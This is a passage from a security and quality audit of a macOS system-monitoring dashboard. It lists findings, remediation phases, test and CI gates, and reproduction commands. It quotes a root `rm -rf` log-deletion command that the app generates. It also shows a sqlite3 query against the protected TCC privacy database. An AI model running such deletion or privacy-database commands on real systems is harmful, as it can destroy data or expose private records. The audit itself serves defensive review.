| **L-04** `[A]` | `CardTitle` renders a `div`, so the dashboard has **no real headings**; the process table has no caption despite a caption primitive existing. | `card.tsx:36-46`; `page.tsx:895-954`; `table.tsx:94-105` | Semantic `h2`/`h3`, labelled sections, visually-hidden table caption. |
| **L-05** `[A]` | No `prefers-reduced-motion` handling despite indefinite pulse animations in seven places. | `page.tsx:141,345,438,616,707,821,926`; `globals.css:120-130` | Disable non-essential animation/transition under reduced motion. |
| **L-06** `[A]` | A 961-line client component holds all state, polling, panels, charts, and the table; every stats tick re-runs the whole tree. | `page.tsx:1-961` | Extract shared schemas and focused panels/hooks; profile before memoising. |
| **L-07** `[A]` | `"private": false` on a local system utility; MIT claimed in both `package.json` and README with **no `LICENSE` file**; 8 unused-symbol lint warnings. | `package.json:4,6`; `README.md:106-108`; lint output | Set `"private": true` unless publication is intended; add the actual `LICENSE`; enforce zero warnings. |
| **L-08** `[B]` | **Allowlist pattern #3 never matches its own generated command.** The route emits `sudo rm -rf "/private/var/log"/*.log "…"/*.gz`, which the third regex cannot match — generator/validator drift, harmless only because `sudo` is separately rejected. | `actions.ts:18` vs `cleanup/route.ts:102-104` | Removed entirely by the C-01 rewrite; the target table is the single source of truth. |
| **L-09** `[B]` | **System crash reports offers a "clean" button that always fails.** `/Library/Logs/DiagnosticReports` passes the allowlist but needs root, so the action reliably errors. | `cleanup/route.ts:184-205`; `actions.ts:16` | Mark `requiresRoot: true` (done in the C-01 table); render as informational with a copyable manual command. |
| **L-10** `[B]` | **Risk labels understate real risk.** `Xcode/Archives` is `"safe"` but archives are irreplaceable (re-signing, re-submission, dSYM symbolication). Wiping all of `~/Library/Caches` while apps run can corrupt app state. | `cleanup/route.ts:49,153` | Reclassify per the C-01 table (`archives → medium`, `user-caches → low`); require an extra confirmation above `safe`. |
| **L-11** `[B]` | **Expensive dead code.** `netstat -ib` (0.19 s/poll) is parsed into `netParts` and discarded; `log show --last 5m` — one of the slowest macOS commands — is assigned to `dnsCache` and never read; `EXPECTED_CONNECTIONS` is unused. Corroborated by the 8 lint warnings. | `stats/route.ts:90-91`; `privacy/route.ts:117,51-56` | Delete, or wire in (the DNS log is the natural input to the H-04 fix). |
| **L-12** `[B]` | `killMessage`'s `setTimeout` is never cleared on unmount. | `page.tsx:338` | Clear in a `useEffect` cleanup. |

---

## 3. Remediation phases

Ordered by risk reduction per unit of effort. **Phase 0 is not optional and is measured in minutes.**

### Phase 0 — Contain now (minutes)

| # | Action | Closes | Effort |
|---|---|---|---|
| 1 | Add `--hostname 127.0.0.1` to `dev` and `start` | H-01 (layer 1) | 1 line |
| 2 | Disable the Cleanup action (feature-flag it off) | C-01 | 1 line |
| 3 | `bun update next@^16.2.10`; drop `shadcn` from `dependencies` | H-05 (~61 of 74) | 2 lines |
| 4 | Stop presenting health/privacy scores as authoritative in the UI | H-03 (interim) | copy change |

After Phase 0 the exploit chain in §1 is broken at three of four links.

### Phase 1 — Rebuild the trust boundary

1. Replace browser-supplied commands with opaque server-owned IDs (C-01).
2. Replace shell deletion with validated `fs` operations; reject symlinks; revalidate before deletion (C-01, L-01, L-08, L-09, L-10).
3. Add `assertLocalRequest()` to every route and action; add a session secret and re-confirmation for destructive operations (H-01).
4. Stop returning executable commands in any API response (C-01).
5. Add security and cache headers (M-12).

### Phase 2 — Make collection reliable

1. Replace `execSync` with the async `probe()` collector; fan out with `Promise.all` (H-02).
2. Add single-flight, caching, and per-scan concurrency limits; raise the minimum interval or go completion-driven (H-02, M-06).
3. Adopt `Probe<T>` + `ScanEnvelope<T>`; withhold scores when incomplete; return 503 on core failure (H-03).
4. Cache machine constants and read the real page size (H-02, M-16).
5. Repair DNS↔process correlation for tracker detection (H-04).
6. Move history/alerts from request count to monotonic time (M-03).
7. Fix signal escalation and PID identity (M-01, M-02).
8. Fix scanner taxonomy and scoring (M-14, M-15, M-17).

### Phase 3 — Make the UI honest and accessible

1. Explicit `idle/loading/success/stale/error` states; reachable first-load error (M-04, M-05).
2. Safe polling controls and pause behaviour (M-06).
3. Keyboard/touch visibility, accessible names, live regions, headings, chart alternatives, responsive reflow, reduced motion (M-07 – M-10, L-04, L-05).
4. Runtime response validation (M-11).

### Phase 4 — Release engineering

1. Full test matrix (§4) and CI gate (§5) (H-06).
2. Correct Node engine, platform dependencies, workspace root, production launcher (M-13).
3. `LICENSE`, `"private": true`, zero-warning lint (L-07).

---

## 4. Required test matrix

| Layer | Coverage |
|---|---|
| **Cleanup boundary** (highest priority) | Unknown ID; every injection string from C-01; path traversal; symlink at target root; symlink *inside* target; dotfiles included; permission failure; exact bytes/count returned; `requiresRoot` rejected |
| **Process actions** | Invalid PID; ownership mismatch; already exited; PID reuse identity; SIGTERM exit; grace-period timeout; SIGKILL fallback actually reached |
| **Parsers** | Valid / empty / malformed / localised / permission-denied / changed-format fixtures for `top`, `vm_stat`, `ps`, `df`, `sysctl`, `lsof`, `sqlite3`; Intel **and** Apple Silicon page sizes |
| **Fail-open scoring** | A missing collector must never raise a score; incomplete results must render as incomplete; `NaN`/`Infinity` never serialised |
| **Tracker detection** | Known tracker → detected; known-safe → clean; unresolvable IP → `unknown`, never `clean` |
| **Route contracts** | Schema, status codes, cache/security headers, timeouts, cancellation, concurrency, bounded execution |
| **Polling** | No overlap; cancel on interval change and unmount; stale-response ordering; visibility pause; first-load retry |
| **Concurrency** | Cleanup in flight must not delay stats > 200 ms; N concurrent stats ≈ max, not sum |
| **Accessibility** | Keyboard-visible destructive actions; accessible names incl. PID; live regions; focus order; 320 px reflow; 400% zoom; reduced motion |
| **Platform/release** | Clean Bun and npm installs; Apple Silicon and Intel; minimum Node; production start; `bun audit` clean of reachable highs |

---

## 5. CI gate

```yaml
# .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  check:
    runs-on: macos-latest          # the app is macOS-specific by design
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
      - run: bun install --frozen-lockfile
      - run: bun run typecheck
      - run: bunx eslint --max-warnings=0
      - run: bun test
      - run: bun run build
      - run: bun audit --audit-level=high
```

---

## 6. Binary release gates

Release stays **blocked** until every box is ticked:

- [ ] No client-controlled string reaches a shell anywhere in the codebase.
- [ ] Deletion is performed by `fs` APIs, confined to permitted roots, with symlinks rejected and identity revalidated.
- [ ] The app is loopback-only by default; destructive actions are authenticated and re-confirmed.
- [ ] `next` ≥ 16.2.5; no reachable high-severity advisory remains undocumented.
- [ ] Cleanup cannot starve stats; concurrent requests do not serialise.
- [ ] Missing probes produce an incomplete/error state and **never** a healthy score.
- [ ] Tracker detection is proven by fixtures and shows a non-zero resolved count live.
- [ ] Kill escalation and PID identity pass deterministic tests.
- [ ] Keyboard, screen-reader, 320 px reflow, and reduced-motion checks pass.
- [ ] `typecheck`, zero-warning lint, tests, build, and audit all pass in CI.
- [ ] README claims match implemented behaviour (tracker detection, TCC audit, SIGKILL escalation, allowlist safety).

---

## 7. Traceability

| Canonical | Source A (`DEEP_APP_AUDIT`) | Source B (parallel session) | Convergence |
|---|---|---|---|
| C-01 | C-01 | P0.1 | ✅ both |
| H-01 | H-01 | P0.2 | ✅ both |
| H-02 | H-02 | P2.6, P2.7 | ✅ both |
| H-03 | H-03 | P1.5 | ✅ both |
| H-04 | H-04 | P1.4 | ✅ both |
| H-05 | H-05 | — (refined attribution) | A found; B verified + apportioned |
| H-06 | H-06 | P4.31 | ✅ both |
| M-01, M-04, M-08 – M-12 | ✔ | — | A only |
| M-02, M-03, M-05 – M-07, M-13 | ✔ | ✔ | ✅ both |
| M-14 – M-17 | — | ✔ | B only |
| L-01, L-02 | ✔ | ✔ | ✅ both |
| L-03 – L-07 | ✔ | — | A only |
| L-08 – L-12 | — | ✔ | B only |

**Corrections applied during the merge:** Source B initially hypothesised that no advisory reached runtime. That was wrong — its path analysis counted only transitive lines containing `›`, rendering a *direct* dependency invisible. `next` carries 23 advisories (12 high). H-05 above reflects the corrected finding, and the exploit chain in §1 exists because of it.

---

## 8. Reproduction commands

```bash
# Static gates
bunx tsc --noEmit
bunx eslint
bun run build
bun test

# Dependency posture + attribution
bun audit
bun audit | grep -E '^[a-z@][a-zA-Z0-9@/._-]*  '     # vulnerable packages + ranges

# Exposure
bunx next dev & lsof -nP -iTCP -sTCP:LISTEN | grep 3000   # expect *:3000 before the fix

# Event-loop serialisation (expect wall clock ≈ SUM before the fix)
for i in 1 2 3 4; do curl -s -o /dev/null -w "%{time_total}\n" localhost:3000/api/stats & done; wait

# Probe cost decomposition
time top -l 1 -n 0 -s 0 >/dev/null      # ~2.2s — 61% of the request floor

# Fail-open proof
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "SELECT client FROM access LIMIT 1"
# expect: authorization denied — yet the UI reports no findings

# Tracker-detection proof
lsof -i -nP | grep ESTABLISHED | awk '{print $9}' | grep -cE '[a-zA-Z]{3,}\.'   # expect 0
```

---

*Findings verified by direct source inspection, static gates, live loopback probing, and a network-backed dependency audit. Payloads for C-01 were tested against the validation predicate only and were never executed.*

*Remediation implemented across five gated phases; see §9 for what the gates do not cover.*

---

## 9. What remains unverified

Stated plainly so the gates are not mistaken for proof of more than they check.

- **Colour contrast** — not measured. No computed-style contrast pass was run, so this document makes no WCAG contrast claim.
- **Screen-reader behaviour** — live regions, accessible names, headings and the table caption are verified *structurally* (present and correctly associated). No assistive-technology run was performed.
- **Reflow at 320 px and 400% zoom** — the fixed 280 px chart width is gone and the grid collapses to one column, verified by inspection of the markup, not in a browser at those viewports.
- **Tracker detection recall** — the pipeline is proven capable of matching (resolution now yields hostnames; a live scan resolved 78 of 113 connections and matched 1 tracker). Actual precision and recall against a known corpus is not measured.
- **The `partial` probe status** — introduced after runtime testing showed `du` discarding usable lower bounds. Exercised by unit tests and observed live, but it is newer than the rest of the collection layer.
- **Intel Macs** — page size is now read from `hw.pagesize` and unit-tested against this host (16384, Apple Silicon). The 4096 path is covered by the fallback test but has not run on real Intel hardware.
- **Load beyond four concurrent requests** — single-flight and bounded concurrency are verified at 4 concurrent stats requests and one concurrent cleanup. Behaviour under sustained multi-tab load is untested.
- **`stopServer`** — exits the process by design, so it is not exercised in the automated suite.

### Deliberate trade-offs

- **A cleanup scan still costs ~20s** and slows a concurrent stats request to 4–6s. The event loop is free throughout — this is genuine disk I/O from walking large trees. Concurrency is capped at 4 to bound it; lowering it further would make the scan slower still.
- **Permission-denied targets are shown as partial rather than hidden.** `~/Library/Caches`, `.Trash`, iOS backups and Mail downloads are TCC-protected, so `du` returns a lower bound. Showing a flagged partial was judged better than either trusting it silently or dropping the largest targets from the list.
- **`assertLocalRequest()` is duplicated across handlers** rather than centralised in middleware. This is intentional: the Next.js versions this app targets have carried repeated middleware/proxy bypass advisories, and a routing bypass must not become an authorisation bypass.
